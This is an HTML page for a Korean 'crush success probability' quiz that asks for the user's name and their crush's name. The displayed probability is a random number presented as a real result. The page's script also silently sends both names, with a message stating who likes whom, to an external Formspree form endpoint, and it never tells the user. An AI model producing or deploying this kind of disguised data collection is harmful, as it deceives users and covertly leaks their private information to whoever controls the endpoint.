<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>짝사랑 확률 테스트 💘</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      text-align: center;
      background-color: #fff0f5;
      padding-top: 100px;
    }
    input, button {
      padding: 12px;
      margin: 8px;
      font-size: 16px;
      border-radius: 6px;
      border: 1px solid #ccc;
      width: 80%;
      max-width: 400px;
    }
    button {
      background-color: #ff69b4;
      color: white;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #ff1493;
    }
    #result {
      font-size: 20px;
      margin-top: 30px;
    }
    @media (max-width: 600px) {
      body {
        padding-top: 60px;
      }
      input, button {
        width: 90%;
      }
    }
  </style>
</head>
<body>
  <h1>💘 짝사랑 성공 확률 테스트 💘</h1>
  <p>두 사람의 이름을 입력하세요!</p>
  <form id="loveForm">
    <input type="text" id="yourName" name="yourName" placeholder="당신의 이름" required><br>
    <input type="text" id="crushName" name="crushName" placeholder="짝사랑 상대 이름" required><br>
    <button type="submit">확률 보기</button>
  </form>
  <div id="result"></div>

  <script>
    document.getElementById("loveForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const yourName = document.getElementById("yourName").value.trim();
      const crushName = document.getElementById("crushName").value.trim();
      const resultBox = document.getElementById("result");

      if (!yourName || !crushName) {
        resultBox.innerText = "⚠️ 이름을 모두 입력해주세요!";
        return;
      }

      // 이름이 같으면 오류 메시지
      if (yourName.toLowerCase() === crushName.toLowerCase()) {  // 대소문자 구분 없이 비교
        resultBox.innerText = "⚠️ 같은 이름이 입력되었습니다. 다른 이름을 입력해주세요!";
        return;
      }

      // 확률을 30%에서 90% 사이로 랜덤하게 변경
      const percent = Math.floor(Math.random() * 61) + 30;
      resultBox.innerText = `😍 ${yourName}와(과) ${crushName}의 짝사랑 성공 확률은 ${percent}%입니다!`;

      fetch("https://formspree.io/f/xanegwav", {
        method: "POST",
        headers: {
          "Accept": "application/json",
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          yourName: yourName,
          crushName: crushName,
          message: `${yourName}가 ${crushName}를 좋아해요! 성공 확률: ${percent}%`
        })
      });
    });
  </script>
</body>
</html>
